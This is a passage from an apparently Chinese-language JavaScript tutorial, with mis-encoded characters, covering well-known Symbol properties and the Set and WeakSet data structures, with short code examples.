class="hljs-title function_">call</span>(obj) === <span class="hljs-string">&#x27;[object Number]&#x27;</span><br>  &#125;<br>&#125;<br><br><span class="hljs-number">1</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MyObj</span> <span class="hljs-comment">// true</span><br><span class="hljs-keyword">const</span> obj = &#123;&#125;<br>obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MyObj</span> <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>Symbol.iterator - å®šä¹‰å¯¹è±¡çš„é»˜è®¤è¿­ä»£å™¨</strong></p><p>å¯¹è±¡çš„ Symbol.iterator å±æ€§æŒ‡å‘è¯¥å¯¹è±¡çš„é»˜è®¤éå†å™¨æ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">[...&#123; [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">iterator</span>]: <span class="hljs-keyword">function</span>*() &#123; <span class="hljs-keyword">yield</span> <span class="hljs-number">1</span>; <span class="hljs-keyword">yield</span> <span class="hljs-number">2</span>; &#125; &#125;] <span class="hljs-comment">// [1, 2]</span><br></code></pre></td></tr></table></figure><p><strong>Symbol.toStringTag - å®šåˆ¶ Object.prototype.toString</strong></p><p>å¯¹è±¡çš„ Symbol.toStringTag å±æ€§ç”¨æ¥è®¾å®šä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå½“å…¶ä»–å¯¹è±¡è°ƒç”¨ Object.prototype.toString åˆ¤æ–­ç±»å‹æ—¶ï¼Œå¦‚æœ Symbol.toStringTag å±æ€§å­˜åœ¨ï¼Œåˆ™è¯¥å±æ€§è®¾å®šçš„å­—ç¬¦ä¸²ä¼šå‡ºç°åœ¨ toString æ–¹æ³•è¿”å›çš„å­—ç¬¦ä¸²ä¸­</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomClass</span> &#123;<br>  get [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toStringTag</span>]() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Custom&#x27;</span><br>  &#125;<br>&#125;<br><span class="hljs-keyword">let</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomClass</span>()<br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj) <span class="hljs-comment">// [object Custom]</span><br><br>(&#123; [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toStringTag</span>]: <span class="hljs-string">&#x27;Custom&#x27;</span> &#125;).<span class="hljs-title function_">toString</span>() <span class="hljs-comment">// [object Custom]</span><br></code></pre></td></tr></table></figure><p><strong>Symbol.species - æŒ‡å®šè¡ç”Ÿå¯¹è±¡çš„æ„é€ å‡½æ•°</strong></p><p>å¯¹è±¡çš„ Symbol.species å±æ€§æŒ‡å‘ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå½“åˆ›å»ºè¡ç”Ÿå¯¹è±¡æ—¶ï¼Œä¼šä½¿ç”¨è¯¥å±æ€§ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Array</span> &#123;<br>  <span class="hljs-keyword">static</span> get [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">species</span>]() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyArray</span>();<br><span class="hljs-keyword">const</span> b = a.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x);<br><br>b <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MyArray</span> <span class="hljs-comment">// false</span><br>b <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span> <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>ç”±äºåˆ›å»º MyArray æ—¶ä½¿ç”¨äº† Symbol.species å±æ€§ï¼Œå› æ­¤ä¼šä½¿ç”¨ Symbol.species è¿”å›çš„å‡½æ•°ä½œä¸ºæ„é€ å‡½æ•°ï¼Œè¡ç”Ÿå¯¹è±¡ b å°±ä¸æ˜¯ MyArray çš„å®ä¾‹</p><p><strong>Symbol.match - å®šåˆ¶å­—ç¬¦ä¸²åŒ¹é…è¡Œä¸º</strong></p><p>å¯¹è±¡çš„ Symbol.match å±æ€§æŒ‡å‘ä¸€ä¸ªå‡½æ•°ï¼Œå½“æ‰§è¡Œ str.match(MyObj)ï¼Œå¦‚æœ MyObj å­˜åœ¨è¯¥å±æ€§ï¼Œä¼šè°ƒç”¨è¯¥å±æ€§æŒ‡å‘çš„å‡½æ•°ï¼Œå¹¶å°†å‡½æ•°çš„è¿”å›å€¼ä½œä¸º str.match(MyObj) çš„è¿”å›å€¼</p><p>é»˜è®¤è¡Œä¸ºä¸­ï¼Œregex[Symbol.match] æŒ‡å‘ RegExp å†…ç½®çš„åŒ¹é…æ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/foo/</span>;<br><span class="hljs-string">&#x27;foobar&#x27;</span>.<span class="hljs-title function_">match</span>(regex); <span class="hljs-comment">// [&quot;foo&quot;, index: 0, input: &quot;foobar&quot;]</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ Symbol.match å±æ€§å¯ä»¥è®©ä»»ä½•å¯¹è±¡æˆä¸ºåˆæ³•çš„ match å‚æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> customMatcher = &#123;<br>  [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">match</span>](str) &#123;<br>    <span class="hljs-keyword">return</span> str.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;hello&#x27;</span>) ? <br>      [<span class="hljs-string">&#x27;åŒ¹é…æˆåŠŸ&#x27;</span>] : <br>      <span class="hljs-literal">null</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-string">&#x27;world hello&#x27;</span>.<span class="hljs-title function_">match</span>(customMatcher); <span class="hljs-comment">// [&quot;åŒ¹é…æˆåŠŸ&quot;]</span><br><span class="hljs-string">&#x27;no match&#x27;</span>.<span class="hljs-title function_">match</span>(customMatcher);    <span class="hljs-comment">// null</span><br></code></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œè¿˜æœ‰ Symbol.replaceã€Symbol.searchã€Symbol.split ç­‰å±æ€§ï¼Œéƒ½æ˜¯ç”¨äºå®šåˆ¶ String å¯¹åº”çš„æ–¹æ³•</p><h2 id="Symbol-ä¸ç›¸å…³æŠ€æœ¯å¯¹æ¯”"><a href="#Symbol-ä¸ç›¸å…³æŠ€æœ¯å¯¹æ¯”" class="headerlink" title="Symbol ä¸ç›¸å…³æŠ€æœ¯å¯¹æ¯”"></a>Symbol ä¸ç›¸å…³æŠ€æœ¯å¯¹æ¯”</h2><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">Symbol</th><th align="left">å­—ç¬¦ä¸²å±æ€§</th><th align="left">WeakMap</th></tr></thead><tbody><tr><td align="left">å”¯ä¸€æ€§</td><td align="left">å”¯ä¸€</td><td align="left">ä¸å”¯ä¸€</td><td align="left">å”¯ä¸€ï¼ˆé”®ä¸ºå¯¹è±¡ï¼‰</td></tr><tr><td align="left">å¯æšä¸¾æ€§</td><td align="left">ä¸å¯æšä¸¾ï¼ˆé»˜è®¤ï¼‰</td><td align="left">å¯æšä¸¾</td><td align="left">N&#x2F;A</td></tr><tr><td align="left">å†…å­˜ç®¡ç†</td><td align="left">å…¨å±€æ³¨å†Œ Symbol éœ€æ‰‹åŠ¨ç®¡ç†</td><td align="left">è‡ªåŠ¨å›æ”¶</td><td align="left">å¯è¢« GC åƒåœ¾å›æ”¶</td></tr><tr><td align="left">ç§æœ‰æ€§</td><td align="left">å¼±ç§æœ‰ï¼ˆåå°„å¯è·å–ï¼‰</td><td align="left">å®Œå…¨å…¬å¼€</td><td align="left">å¼ºç§æœ‰</td></tr><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">åè®®å®ç°&#x2F;é˜²å†²çª</td><td align="left">å¸¸è§„æ•°æ®å­˜å‚¨</td><td align="left">çœŸæ­£ç§æœ‰æ•°æ®å­˜å‚¨</td></tr></tbody></table><h2 id="Symbol-çš„æ ¸å¿ƒä»·å€¼"><a href="#Symbol-çš„æ ¸å¿ƒä»·å€¼" class="headerlink" title="Symbol çš„æ ¸å¿ƒä»·å€¼"></a>Symbol çš„æ ¸å¿ƒä»·å€¼</h2><ul><li>æä¾›çœŸæ­£å”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œè§£å†³å‘½åå†²çªé—®é¢˜</li><li>å®ç° JavaScript å†…ç½®åè®®ï¼ˆå¦‚è¿­ä»£åè®®ï¼‰</li><li>æ”¯æŒå…ƒç¼–ç¨‹ï¼Œæ”¹å˜è¯­è¨€å†…éƒ¨è¡Œä¸º</li><li>ä¸ºå¯¹è±¡æä¾›å¼±å°è£…èƒ½åŠ›ï¼ˆéå®Œå…¨ç§æœ‰ï¼‰</li></ul><h1 id="ES6-Set-å’Œ-Map-ç»“æ„"><a href="#ES6-Set-å’Œ-Map-ç»“æ„" class="headerlink" title="ES6+ Set å’Œ Map ç»“æ„"></a>ES6+ Set å’Œ Map ç»“æ„</h1><h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><h3 id="Set-çš„å®šä¹‰å’ŒåŸºæœ¬ç”¨æ³•"><a href="#Set-çš„å®šä¹‰å’ŒåŸºæœ¬ç”¨æ³•" class="headerlink" title="Set çš„å®šä¹‰å’ŒåŸºæœ¬ç”¨æ³•"></a>Set çš„å®šä¹‰å’ŒåŸºæœ¬ç”¨æ³•</h3><p>Set æ˜¯ ES6 å¼•å…¥çš„æ–°çš„æ•°æ®ç»“æ„ï¼Œæ˜¯ä¸€ç§é›†åˆç±»å‹ï¼Œç±»ä¼¼äºæ•°ç»„ï¼Œä½†æˆå‘˜çš„å€¼æ˜¯å”¯ä¸€çš„ï¼Œæ²¡æœ‰é‡å¤æˆå‘˜ã€‚Set æœ¬èº«æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œç”¨äºç”Ÿæˆ Set æ•°æ®ç»“æ„ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()<br></code></pre></td></tr></table></figure><p>Set()å‡½æ•°å¯ä»¥æ¥å—ä¸€ä¸ªæ•°ç»„ï¼ˆæˆ–è€…å…·æœ‰ iterable æ¥å£çš„å…¶ä»–æ•°æ®ç»“æ„ï¼‰ä½œä¸ºå‚æ•°ï¼Œç”¨æ¥åˆå§‹åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>])<br></code></pre></td></tr></table></figure><h3 id="Set-çš„æ ¸å¿ƒç‰¹æ€§"><a href="#Set-çš„æ ¸å¿ƒç‰¹æ€§" class="headerlink" title="Set çš„æ ¸å¿ƒç‰¹æ€§"></a>Set çš„æ ¸å¿ƒç‰¹æ€§</h3><p><strong>å”¯ä¸€æ€§</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br>set.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>);<br>set.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>);<br>set.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(set.<span class="hljs-property">size</span>); <span class="hljs-comment">// 2 (1 å’Œ &#x27;1&#x27; æ˜¯ä¸åŒçš„å€¼)</span><br></code></pre></td></tr></table></figure><p>å”¯ä¸€æ€§åˆ¤æ–­é‡‡ç”¨ <code>SameValueZero</code> ç®—æ³•ï¼š</p><ul><li>NaN è¢«è§†ä¸ºç›¸ç­‰</li><li>+0 å’Œ -0 è¢«è§†ä¸ºç›¸ç­‰</li><li>å¯¹è±¡å¼•ç”¨æ¯”è¾ƒï¼ˆä¸åŒå¯¹è±¡å³ä½¿å†…å®¹ç›¸åŒä¹Ÿè¢«è§†ä¸ºä¸åŒï¼‰</li></ul><p>æ ¹æ®è¯¥ç‰¹æ€§å¯ä»¥å®ç°æ•°ç»„å»é‡ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å»é™¤æ•°ç»„çš„é‡å¤æˆå‘˜</span><br>[...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(array)]<br></code></pre></td></tr></table></figure><p><strong>å€¼ç±»å‹æ”¯æŒ</strong></p><p>Set æ•°æ®ç»“æ„å¯ä»¥å­˜å‚¨ä»»æ„ç±»å‹çš„å€¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<br>  <span class="hljs-number">1</span>, <br>  <span class="hljs-string">&#x27;text&#x27;</span>,<br>  &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;obj&#x27;</span>&#125;,<br>  [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>],<br>  <span class="hljs-title class_">NaN</span>,<br>  <span class="hljs-literal">undefined</span>,<br>  <span class="hljs-literal">null</span><br>]);<br></code></pre></td></tr></table></figure><h3 id="Set-çš„åŸºç¡€-API-è¯¦è§£"><a href="#Set-çš„åŸºç¡€-API-è¯¦è§£" class="headerlink" title="Set çš„åŸºç¡€ API è¯¦è§£"></a>Set çš„åŸºç¡€ API è¯¦è§£</h3><table><thead><tr><th align="left">æ–¹æ³•&#x2F;å±æ€§</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">new Set(iterable)</td><td align="left">æ„é€ å‡½æ•°</td></tr><tr><td align="left">set.has(value)</td><td align="left">æ£€æŸ¥å€¼æ˜¯å¦å­˜åœ¨</td></tr><tr><td align="left">set.add(value)</td><td align="left">æ·»åŠ å€¼</td></tr><tr><td align="left">set.delete(value)</td><td align="left">åˆ é™¤å€¼</td></tr><tr><td align="left">set.clear(value)</td><td align="left">æ¸…ç©ºé›†åˆ</td></tr><tr><td align="left">set.size</td><td align="left">è·å– Set å®ä¾‹çš„æˆå‘˜æ•°é‡ï¼ˆéå‡½æ•°å±æ€§ï¼Œä¸èƒ½ set.size()ï¼‰</td></tr></tbody></table><h3 id="Set-çš„è¿­ä»£æ“ä½œ"><a href="#Set-çš„è¿­ä»£æ“ä½œ" class="headerlink" title="Set çš„è¿­ä»£æ“ä½œ"></a>Set çš„è¿­ä»£æ“ä½œ</h3><p>Set ç»“æ„çš„å®ä¾‹æœ‰å››ä¸ªè¿­ä»£æ–¹æ³•ï¼Œç”¨äºéå†æˆå‘˜ï¼š</p><ul><li>set.values()ï¼šè¿”å›é”®å€¼çš„éå†å™¨</li><li>set.keys()ï¼šè¿”å›é”®åçš„éå†å™¨</li><li>set.entries()ï¼šè¿”å›é”®å€¼å¯¹çš„éå†å™¨</li><li>set.forEach()ï¼šä½¿ç”¨å›è°ƒå‡½æ•°å˜é‡æˆå‘˜</li></ul><p>Set å®ä¾‹çš„éå†é¡ºåºå°±æ˜¯æˆå‘˜æ’å…¥çš„é¡ºåºï¼Œè¯¥ç‰¹æ€§å¯ä»¥ç”¨äºä¿è¯å›è°ƒå‡½æ•°åˆ—è¡¨çš„æ‰§è¡Œé¡ºåºã€‚Set ç»“æ„å®ä¾‹çš„é»˜è®¤éå†å™¨ç”Ÿæˆå‡½æ•°å°±æ˜¯å®ƒçš„ values()æ–¹æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>]);<br><br><span class="hljs-comment">// 1. for...of</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> set) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(item);<br>&#125;<br><br><span class="hljs-comment">// 2. forEach</span><br>set.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">value, valueAgain</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value); <span class="hljs-comment">// æ³¨æ„ï¼šä¸¤ä¸ªå‚æ•°ç›¸åŒ</span><br>&#125;);<br><br><span class="hljs-comment">// 3. è·å–è¿­ä»£å™¨</span><br><span class="hljs-keyword">const</span> iterator = set.<span class="hljs-title function_">values</span>(); <span class="hljs-comment">// æˆ– set[Symbol.iterator]()</span><br></code></pre></td></tr></table></figure><h3 id="Set-çš„é«˜çº§ç‰¹æ€§ä¸åº”ç”¨"><a href="#Set-çš„é«˜çº§ç‰¹æ€§ä¸åº”ç”¨" class="headerlink" title="Set çš„é«˜çº§ç‰¹æ€§ä¸åº”ç”¨"></a>Set çš„é«˜çº§ç‰¹æ€§ä¸åº”ç”¨</h3><p><strong>æ€§èƒ½ä¼˜åŠ¿</strong></p><p>Set çš„æŸ¥æ‰¾æ€§èƒ½è¿œä¼˜äºæ•°ç»„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ•°ç»„ vs Set æŸ¥æ‰¾æ€§èƒ½å¯¹æ¯”</span><br><span class="hljs-keyword">const</span> arr = [<span class="hljs-comment">/* 10,000 ä¸ªå…ƒç´  */</span>];<br><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(arr);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Array&#x27;</span>);<br>arr.<span class="hljs-title function_">includes</span>(<span class="hljs-number">9999</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Array&#x27;</span>); <span class="hljs-comment">// ~0.1ms</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Set&#x27;</span>);<br>set.<span class="hljs-title function_">has</span>(<span class="hljs-number">9999</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Set&#x27;</span>); <span class="hljs-comment">// ~0.005ms</span><br></code></pre></td></tr></table></figure><p><strong>é›†åˆè¿ç®—å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å¹¶é›†</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">union</span>(<span class="hljs-params">setA, setB</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([...setA, ...setB]);<br>&#125;<br><br><span class="hljs-comment">// äº¤é›†</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">intersection</span>(<span class="hljs-params">setA, setB</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([...setA].<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> setB.<span class="hljs-title function_">has</span>(x)));<br>&#125;<br><br><span class="hljs-comment">// å·®é›†</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">difference</span>(<span class="hljs-params">setA, setB</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([...setA].<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> !setB.<span class="hljs-title function_">has</span>(x)));<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¯¹è±¡å¼•ç”¨ç®¡ç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> users = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trackUser</span>(<span class="hljs-params">user</span>) &#123;<br>  users.<span class="hljs-title function_">add</span>(user);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">untrackUser</span>(<span class="hljs-params">user</span>) &#123;<br>  users.<span class="hljs-title function_">delete</span>(user);<br>&#125;<br><br><span class="hljs-comment">// è‡ªåŠ¨å»é‡ï¼šåŒä¸€å¯¹è±¡ä¸ä¼šè¢«é‡å¤æ·»åŠ </span><br></code></pre></td></tr></table></figure><h3 id="Set-çš„å®ç°åŸç†"><a href="#Set-çš„å®ç°åŸç†" class="headerlink" title="Set çš„å®ç°åŸç†"></a>Set çš„å®ç°åŸç†</h3><p>ç°ä»£ JavaScript å¼•æ“é€šå¸¸ä½¿ç”¨ï¼š</p><ul><li>å“ˆå¸Œè¡¨ä½œä¸ºåº•å±‚å®ç°</li><li>ä½¿ç”¨ å¼€æ”¾å¯»å€æ³• æˆ– é“¾è¡¨æ³• è§£å†³å†²çª</li><li>è‡ªåŠ¨æ‰©å®¹æœºåˆ¶ï¼ˆç±»ä¼¼ Mapï¼‰</li></ul><h2 id="WeakSet"><a href="#WeakSet" class="headerlink" title="WeakSet"></a>WeakSet</h2><h3 id="WeakSet-çš„å®šä¹‰"><a href="#WeakSet-çš„å®šä¹‰" class="headerlink" title="WeakSet çš„å®šä¹‰"></a>WeakSet çš„å®šä¹‰</h3><p>WeakSet æ˜¯ ES6 å¼•å…¥çš„ä¸€ç§ç‰¹æ®Šé›†åˆç±»å‹ï¼Œä¸ Set ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸é‡å¤çš„å€¼çš„é›†åˆã€‚</p><h3 id="WeakSet-çš„æ ¸å¿ƒç‰¹æ€§"><a href="#WeakSet-çš„æ ¸å¿ƒç‰¹æ€§" class="headerlink" title="WeakSet çš„æ ¸å¿ƒç‰¹æ€§"></a>WeakSet çš„æ ¸å¿ƒç‰¹æ€§</h3><p><strong>æˆå‘˜ç±»å‹é™åˆ¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// WeakSet çš„æˆå‘˜åªèƒ½æ˜¯å¯¹è±¡å’Œ Symbol å€¼ï¼Œä¸èƒ½æ˜¯å…¶ä»–ç±»å‹çš„å€¼</span><br><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakSet</span>();<br>ws.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// æŠ¥é”™</span><br>ws.<span class="hljs-title function_">add</span>(<span class="hljs-title class_">Symbol</span>()) <span class="hljs-comment">// ä¸æŠ¥é”™</span><br></code></pre></td></tr></table></figure><p><strong>å¼±å¼•ç”¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> obj = &#123; <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;important&#x27;</span> &#125;;<br><span class="hljs-keyword">const</span> weakset = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakSet</span>();<br><br>weakset.<span class="hljs-title function_">add</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(weakset.<span class="hljs-title function_">has</span>(obj)); <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// å½“å¯¹è±¡ä¸å†è¢«å¼•ç”¨æ—¶</span><br>obj = <span class="hljs-literal">null</span>; <br><br><span class="hljs-comment">// åƒåœ¾å›æ”¶åï¼Œå¯¹è±¡ä¼šè‡ªåŠ¨ä»WeakSetç§»é™¤</span><br><span class="hljs-comment">// weakset.has(åŸobj) å°†è¿”å› false</span><br></code></pre></td></tr></table></figure><p><strong>ä¸å¯éå†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakSet</span>();<br>ws.<span class="hljs-title function_">add</span>(&#123;&#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ws.<span class="hljs-property">size</span>); <span class="hljs-comment">// undefined (æ— sizeå±æ€§)</span><br><br><span class="hljs-comment">// ä»¥ä¸‹æ“ä½œéƒ½ä¼šæŠ¥é”™ï¼š</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> item <span class="hljs-keyword">of</span> ws) &#123;&#125;<br>ws.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">() =&gt;</span> &#123;&#125;)<br>[...ws]<br></code></pre></td></tr></table></figure><h3 id="WeakSet-çš„-API-è¯¦è§£"><a href="#WeakSet-çš„-API-è¯¦è§£" class="headerlink" title="WeakSet çš„ API è¯¦è§£"></a>WeakSet çš„ API è¯¦è§£</h3><table><thead><tr><th align="left">æ–¹æ³•&#x2F;å±æ€§</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">new WeakSet(iterable)</td><td align="left">æ„é€ å‡½æ•°</td></tr><tr><td align="left">weakSet.has(value)</td><td align="left">æ£€æŸ¥å€¼æ˜¯å¦å­˜åœ¨</td></tr><tr><td align="left">weakSet.add(value)</td><td align="left">æ·»åŠ å€¼</td></tr><tr><td align="left">weakSet.delete(value)</td><td align="left">åˆ é™¤å€¼</td></tr></tbody></table><p>WeakSet æ²¡æœ‰ size 